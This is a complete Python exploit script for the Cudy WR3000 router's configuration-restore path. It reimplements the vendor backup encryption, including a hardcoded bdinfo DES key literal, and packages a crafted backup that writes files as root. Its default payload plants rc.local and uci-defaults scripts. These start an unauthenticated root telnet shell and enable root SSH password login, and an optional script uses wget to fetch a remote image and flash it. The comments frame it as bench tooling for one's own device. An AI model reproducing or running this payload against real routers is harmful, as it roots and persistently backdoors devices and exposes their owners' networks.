#!/usr/bin/env python3
"""
craft_backup.py - build/inspect the Cudy WR3000 v2.0 (stock OpenWrt 2.5.24)
configuration-backup container and craft a root file-write payload for the
LuCI "Restore backup" path. Host-only: never contacts the router.

WHAT THE VENDOR DOES
--------------------
/usr/bin/crypt (default mode = no -a/-g/-n flag) is used by both the LuCI
backup download action (sysupgrade -b - | crypt -e) and the LuCI restore
handler (crypt -d -i /tmp/backup.bin -o /tmp/backup.tar.gz).

  key_string = gethostname() + "@" + bdinfo_get_value("secret")
  key        = MD5(key_string)                       -> AES-128 key
                 (on stock Cudy WR3000 v2.0 gethostname() == bdinfo "board"
                  == "WR3000", set by /bin/config_generate from bdinfo)

  container  = 48-byte encrypted header + AES-CBC(IV=0) payload chunks
    header plaintext (little endian):
      +0x00  u32  magic 0xa1ecd5bd
      +0x04  u32  unix timestamp (__time64)
      +0x08  u32  random()          (unseeded libc -> constant per boot)
      +0x0c  4 bytes zero
      +0x10  32 bytes /etc/rom_version, NUL padded (e.g. 2.5.24-20260727-122111)
    header ciphertext = AES-128-CBC(key, IV=0) over those 48 bytes
    payload: chunks of 0x400 bytes; EACH chunk is enciphered independently with
      AES-128-CBC(key, IV=0) and written raw.
      Final short chunk R (R < 0x400) uses the vendor padding:
        k = R % 16
        buf = data[0:R] + zero pad;  buf[R+k] = k
        enc_len = (R + k + 16) & ~0xf
        file chunk = AES-CBC(buf[0:enc_len]) followed by
                     (R + k + 16 - enc_len) zero bytes
      Decode: n = final chunk length; pt = AES-CBC-decrypt(chunk[:n & ~0xf]);
              out_len = n - 16 - pt[n-16]   (when pt[n-16] <= n-16, else n-16)

  crypt -d also prints to stdout:
      timestamp: <u32>
      build: <version string>
  and LuCI's restore CBI parses exactly those two lines.

bdinfo("secret") lives in the DES-CBC encrypted mtd6 bdinfo partition; see
bdinfo_value() below (same algorithm as the repo's tools/decrypt_bdinfo.py).
The secret itself is a credential: this tool reads it from a local dump supplied
by the operator and never hardcodes it.

RESTORE PATH (stock 2.5.24)
---------------------------
LuCI upload   -> /tmp/backup.bin
              -> crypt -d -i /tmp/backup.bin -o /tmp/backup.tar.gz
click Restore -> tar -tzf /tmp/backup.tar.gz            (sanity check only)
              -> GET /cgi-bin/luci/admin/system/reboot?backup=
              -> fork_exec("sleep 1; /etc/init.d/uhttpd stop; "
                           "sysupgrade -r /tmp/backup.tar.gz && "
                           "preset defaults && reboot")
/sbin/sysupgrade -r -> tar -C / -xzf /tmp/backup.tar.gz  (no whitelist!)
preset defaults     -> sources every file in /etc/uci-defaults/ as root
reboot              -> /etc/init.d/done runs "sh /etc/rc.local"

So a container whose payload drops files under etc/ is an arbitrary root file
write; the default payload here arms a root channel that survives the reboot.

USAGE
-----
  # 1. key material from a local bdinfo dump (mtd6)
  python3 craft_backup.py emit --bdinfo /path/to/mtd6-bdinfo.bin \
      -o /tmp/crafted_backup.bin

  #    or pass the values explicitly (hostname from to the LuCI status page)
  python3 craft_backup.py emit --hostname WR3000 --secret '<bdinfo secret>' -o out.bin

  # 2. inspect any sample container (metadata + tar listing)
  python3 craft_backup.py decrypt /tmp/cudy-backup/backup_sample.bin \
      --bdinfo /path/to/mtd6-bdinfo.bin

  # 3. prove the codec against a real download
  python3 craft_backup.py selftest --sample /tmp/cudy-backup/backup_sample.bin \
      --bdinfo /path/to/mtd6-bdinfo.bin

  # custom payload tree instead of the built-in channel payload
  python3 craft_backup.py emit --bdinfo dump.bin --dir ./payload_root -o out.bin

Requires pycryptodome (repo: .provision-venv/bin/python; or pip install pycryptodome).
"""
import argparse
import hashlib
import io
import os
import re
import struct
import sys
import tarfile
import time

try:
    from Crypto.Cipher import AES, DES
except ImportError:  # pragma: no cover
    sys.exit("craft_backup.py: pycryptodome required (pip install pycryptodome)")

MAGIC = 0xA1ECD5BD
HEADER_LEN = 0x30
CHUNK = 0x400

# Public literals lifted from the stock vendor rootfs (no secrets):
#   /usr/lib/libbdinfo.so DES key literal for the mtd6 bdinfo partition
BDINFO_KEY_LITERAL = b"88T3j05dtFu8="


# --------------------------------------------------------------------------
# bdinfo (mtd6) decode - mirrors the repo's tools/decrypt_bdinfo.py
# --------------------------------------------------------------------------
def _parity(b):
    out = bytearray()
    for x in b:
        x &= 0xFE
        out.append(x | (1 - (bin(x).count("1") & 1)))
    return bytes(out)


def des_string_to_key(s):
    key = bytearray(8)
    for i, ch in enumerate(s):
        if i % 16 < 8:
            key[i % 8] ^= (ch << 1) & 0xFF
        else:
            j = ch
            j = ((j << 4) & 0xF0) | ((j >> 4) & 0x0F)
            j = ((j << 2) & 0xCC) | ((j >> 2) & 0x33)
            j = ((j << 1) & 0xAA) | ((j >> 1) & 0x55)
            key[7 - (i % 8)] ^= j
    key = _parity(key)
    data = s + b"\x00" * ((-len(s)) % 8)
    return _parity(DES.new(bytes(key), DES.MODE_CBC, bytes(key)).encrypt(data)[-8:])


def des_cbc_decrypt(key, data):
    data = data + b"\x00" * ((-len(data)) % 8)
    return DES.new(key, DES.MODE_CBC, b"\x00" * 8).decrypt(data)


def bdinfo_value(dump_path, want):
    """Return one 'key = value' field from a raw mtd6 bdinfo dump."""
    blob = open(dump_path, "rb").read()
    last = max((i for i, b in enumerate(blob) if b != 0xFF), default=-1)
    if last >= 0:
        blob = blob[: last + 1]
    key = des_string_to_key(BDINFO_KEY_LITERAL)
    best = None
    for off in range(0, 17, 4):
        pt = des_cbc_decrypt(key, blob[off:])
        text = pt.split(b"\x00", 1)[0]
        score = (text.count(b"board = ") * 2 + text.count(b"BDINFO_END")) * 1000
        score += sum(32 <= b < 127 or b in (9, 10, 13) for b in pt[:512])
        if best is None or score > best[0]:
            best = (score, pt)
    text = best[1]
    if b"BDINFO_END" in text:
        text = text.split(b"BDINFO_END", 1)[0]
    kv = dict(re.findall(rb"([A-Za-z_][A-Za-z0-9_]*)\s*=\s*([^\r\n]+)", text))
    if want.encode() not in kv:
        raise SystemExit("bdinfo: field %r not found (dump format unexpected)" % want)
    return kv[want.encode()].decode()


def derive_key(hostname, secret):
    return hashlib.md5(hostname.encode() + b"@" + secret.encode()).digest()


# --------------------------------------------------------------------------
# container codec
# --------------------------------------------------------------------------
class BackupCodec:
    def __init__(self, key):
        if len(key) != 16:
            raise ValueError("expecting 16-byte AES key")
        self.key = key

    def _cbc(self, data, encrypt):
        c = AES.new(self.key, AES.MODE_CBC, b"\x00" * 16)
        return c.encrypt(data) if encrypt else c.decrypt(data)

    def encrypt(self, plaintext, timestamp=None, randval=0, version="", header_plain=None):
        """Build an encrypted vendor backup. Returns (blob, header_plain)."""
        if header_plain is None:
            if len(version.encode()) > 32:
                raise ValueError("version string longer than 32 bytes")
            header_plain = (
                struct.pack("<I", MAGIC)
                + struct.pack("<I", int(time.time()) if timestamp is None else int(timestamp))
                + struct.pack("<I", int(randval) & 0xFFFFFFFF)
                + b"\x00" * 4
                + version.encode().ljust(32, b"\x00")[:32]
            )
        out = bytearray(self._cbc(header_plain, True))
        i = 0
        while i < len(plaintext):
            chunk = plaintext[i:i + CHUNK]
            i += CHUNK
            n = len(chunk)
            if n == CHUNK:
                out += self._cbc(chunk, True)
            else:
                k = n & 0xF
                buf = bytearray(CHUNK)
                buf[:n] = chunk
                buf[n + k] = k
                enc_len = (n + k + 16) & ~0xF
                out += self._cbc(bytes(buf[:enc_len]), True)
                out += b"\x00" * (n + k + 16 - enc_len)
        return bytes(out), header_plain

    def decrypt(self, blob, with_header=False):
        """Decrypt a vendor backup. Returns payload (and header) or raises."""
        if len(blob) < HEADER_LEN:
            raise ValueError("container shorter than the 48-byte header")
        header_plain = self._cbc(blob[:HEADER_LEN], False)
        if struct.unpack("<I", header_plain[:4])[0] != MAGIC:
            raise ValueError("bad magic (wrong key, wrong hostname or not a Cudy backup)")
        data = blob[HEADER_LEN:]
        out = bytearray()
        i = 0
        while i < len(data):
            chunk = data[i:i + CHUNK]
            i += CHUNK
            n = len(chunk)
            if n == CHUNK:
                out += self._cbc(chunk, False)
            else:
                dlen = n & ~0xF
                pt = self._cbc(chunk[:dlen], False)
                cut = n - 16
                val = pt[cut] if 0 <= cut < len(pt) else 0
                if val <= cut:
                    cut -= val
                out += pt[:cut]
        header = {
            "magic": struct.unpack("<I", header_plain[0:4])[0],
            "timestamp": struct.unpack("<I", header_plain[4:8])[0],
            "random": struct.unpack("<I", header_plain[8:12])[0],
            "version": header_plain[16:48].rstrip(b"\x00").decode("utf-8", "replace"),
        }
        return (bytes(out), header) if with_header else bytes(out)


# --------------------------------------------------------------------------
# payload building
# --------------------------------------------------------------------------
OMO_LOGIN = b"""#!/bin/sh
# root shell provider for the OMO bench channel (started by /etc/rc.local)
exec /bin/ash --login
"""

OMO_RCLOCAL = b"""#!/bin/sh
# OMO bench root channel, armed by a crafted config-restore backup.
# /etc/init.d/done (START=95) runs this file on every boot.
mkdir -p /root/.ssh
chmod 700 /root/.ssh 2>/dev/null
chmod 600 /root/.ssh/authorized_keys 2>/dev/null
/usr/sbin/telnetd -p 23 -l /etc/omo_login.sh 2>/dev/null
/etc/init.d/dropbear restart 2>/dev/null
exit 0
"""

OMO_UCI = b"""#!/bin/sh
# Runs as root inside "preset defaults" right after the restore extraction.
# Gives an immediate channel even before the reboot, and keeps a log marker.
mkdir -p /root/.ssh
chmod 700 /root/.ssh 2>/dev/null
chmod 600 /root/.ssh/authorized_keys 2>/dev/null
/usr/sbin/telnetd -p 23 -l /etc/omo_login.sh 2>/dev/null
echo "omo restore payload executed $(date 2>/dev/null)" >> /tmp/omo-restore.log 2>/dev/null
exit 0
"""

DROPBEAR_CONF = b"""config dropbear
\toption PasswordAuth 'on'
\toption RootPasswordAuth 'on'
\toption Port '22'
"""


def default_payload(ssh_pubkey=None, flash_url=None):
    files = [
        ("etc/rc.local", 0o755, OMO_RCLOCAL),
        ("etc/omo_login.sh", 0o755, OMO_LOGIN),
        ("etc/uci-defaults/99-omo-arm", 0o755, OMO_UCI),
    ]
    if ssh_pubkey:
        key = ssh_pubkey.strip() + b"\n"
        files.append(("root/.ssh/authorized_keys", 0o600, key))
        files.append(("etc/dropbear/authorized_keys", 0o600, key))
        files.append(("etc/config/dropbear", 0o644, DROPBEAR_CONF))
    if flash_url:
        script = (
            b"#!/bin/sh\n"
            b"# optional: pull and flash an image from the bench host during the restore\n"
            b"wget -O /tmp/omo-fw.bin '" + flash_url.encode() + b"' || exit 0\n"
            b"sysupgrade -n /tmp/omo-fw.bin\n"
        )
        files.append(("etc/uci-defaults/98-omo-flash", 0o755, script))
    return files


def build_tar_gz(files):
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz", format=tarfile.USTAR_FORMAT) as tf:
        for name, mode, data in files:
            if isinstance(data, str):
                data = data.encode()
            ti = tarfile.TarInfo(name)
            ti.size = len(data)
            ti.mode = mode
            ti.uid = ti.gid = 0
            ti.uname = ti.gname = "root"
            ti.mtime = 0
            tf.addfile(ti, io.BytesIO(data))
    return buf.getvalue()


def pad_until_safe(files):
    """Add tmp/.omo-pad random bytes until the vendor final-chunk decode is safe.

    The on-device decoder treats the last file chunk as full when
    (R + (R%16) + 16) >= 0x400, so pick an R that cannot be misread.
    """
    base = build_tar_gz(files)
    for n in range(0, 4096):
        data = build_tar_gz(files + [("tmp/.omo-pad", 0o600, os.urandom(n))]) if n else base
        r = len(data) % CHUNK
        if r == 0 or r + (r & 0xF) + 16 < CHUNK:
            return data
    raise SystemExit("could not fit payload into a safe final-chunk size")


def add_dir_tree(files, root):
    root = os.path.abspath(root)
    for dirpath, _dirnames, filenames in os.walk(root):
        for fn in sorted(filenames):
            full = os.path.join(dirpath, fn)
            rel = os.path.relpath(full, root).replace(os.sep, "/")
            mode = os.stat(full).st_mode & 0o777
            files.append((rel, mode, open(full, "rb").read()))
    return files


# --------------------------------------------------------------------------
# CLI
# --------------------------------------------------------------------------
def get_key(args):
    hostname = args.hostname
    secret = args.secret
    if args.bdinfo:
        if not hostname:
            hostname = bdinfo_value(args.bdinfo, "board")
        if not secret:
            secret = bdinfo_value(args.bdinfo, "secret")
    if not hostname or not secret:
        raise SystemExit("provide --bdinfo DUMP, or --hostname and --secret")
    return derive_key(hostname, secret), hostname


def tar_names(blob):
    return tarfile.open(fileobj=io.BytesIO(blob), mode="r:gz").getnames()


def cmd_emit(args):
    key, hostname = get_key(args)
    codec = BackupCodec(key)
    if args.dir:
        files = add_dir_tree([], args.dir)
    else:
        pub = None
        if args.ssh_key:
            pub = open(args.ssh_key, "rb").read() if os.path.exists(args.ssh_key) else args.ssh_key.encode()
        files = default_payload(pub, args.flash_url)
    for spec in args.add or []:
        p, local = spec.split("=", 1)
        files.append((p, 0o644, open(local, "rb").read()))
    version = args.version
    if not version:
        try:
            version = open(args.rom_version).read().strip()
        except OSError:
            version = "2.5.24-20260727-122111"
    tar_gz = pad_until_safe(files)
    blob, header = codec.encrypt(tar_gz, version=version)
    with open(args.output, "wb") as f:
        f.write(blob)
    back, meta = codec.decrypt(blob, with_header=True)
    names = tar_names(back)
    print("[*] key material: hostname=%r, aes128=%s" % (hostname, key.hex()))
    print("[*] header: magic=0x%08x timestamp=%d build=%s"
          % (meta["magic"], meta["timestamp"], meta["version"]))
    print("[*] tar.gz: %d bytes, members:" % len(back))
    for n in names:
        print("      " + n)
    print("[+] container: %s (%d bytes, sha256 %s)"
          % (args.output, len(blob), hashlib.sha256(blob).hexdigest()))
    print("[+] self-check decrypt: OK")


def cmd_decrypt(args):
    key, hostname = get_key(args)
    blob = open(args.input, "rb").read()
    payload, meta = BackupCodec(key).decrypt(blob, with_header=True)
    print("[*] hostname=%r  container=%d bytes" % (hostname, len(blob)))
    print("[*] header magic=0x%08x timestamp=%d random=%d build=%s"
          % (meta["magic"], meta["timestamp"], meta["random"], meta["version"]))
    print("[*] payload %d bytes magic=%s" % (len(payload), payload[:3].hex()))
    names = tar_names(payload)
    print("[*] %d tar members" % len(names))
    if args.output:
        with open(args.output, "wb") as f:
            f.write(payload)
        print("[+] wrote decrypted tar.gz -> " + args.output)
    for n in names:
        print("      " + n)


def cmd_selftest(args):
    key, hostname = get_key(args)
    codec = BackupCodec(key)
    blob = open(args.sample, "rb").read()
    payload, meta = codec.decrypt(blob, with_header=True)
    assert payload[:2] == b"\x1f\x8b", "decrypted payload is not gzip"
    names = tar_names(payload)
    print("[+] decrypt %s: gzip OK, %d members, sha256(payload)=%s"
          % (args.sample, len(names), hashlib.sha256(payload).hexdigest()))
    header_plain = codec._cbc(blob[:HEADER_LEN], False)
    reenc, _ = codec.encrypt(payload, header_plain=header_plain)
    same = reenc == blob
    print("[%s] re-encrypt with the same header+payload: %s (%d bytes)"
          % ("+" if same else "!", "BYTE-IDENTICAL" if same else "DIFFERS",
             len(reenc)))
    if not same:
        for i, (a, b) in enumerate(zip(reenc, blob)):
            if a != b:
                print("      first difference at offset %d: %02x != %02x" % (i, a, b))
                break
        raise SystemExit(1)
    print("[+] codec == vendor /usr/bin/crypt default mode")


def main():
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[1],
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    sub = ap.add_subparsers(dest="cmd", required=True)

    def key_args(p):
        p.add_argument("--bdinfo", help="raw mtd6 bdinfo partition dump (local)")
        p.add_argument("--hostname", help="device hostname (stock default: bdinfo board)")
        p.add_argument("--secret", help="bdinfo 'secret' value (avoid on the command line)")

    e = sub.add_parser("emit", help="build a crafted encrypted backup container")
    key_args(e)
    e.add_argument("-o", "--output", required=True)
    e.add_argument("--dir", help="payload directory tree to pack instead of the default payload")
    e.add_argument("--ssh-key", help="public key file to install for root ssh (project key)")
    e.add_argument("--flash-url", help="optional: also add a uci-defaults script that fetches and flashes this URL")
    e.add_argument("--add", action="append", metavar="PATH=LOCALFILE", help="extra payload file")
    e.add_argument("--version", help="header build string (default: read --rom-version or 2.5.24 value)")
    e.add_argument("--rom-version", default="/etc/rom_version")
    e.set_defaults(func=cmd_emit)

    d = sub.add_parser("decrypt", help="decrypt/inspect a vendor backup container")
    key_args(d)
    d.add_argument("input")
    d.add_argument("-o", "--output", help="write the decrypted tar.gz here")
    d.set_defaults(func=cmd_decrypt)

    s = sub.add_parser("selftest", help="prove the codec against a real downloaded backup")
    key_args(s)
    s.add_argument("--sample", required=True)
    s.set_defaults(func=cmd_selftest)

    args = ap.parse_args()
    args.func(args)


if __name__ == "__main__":
    main()
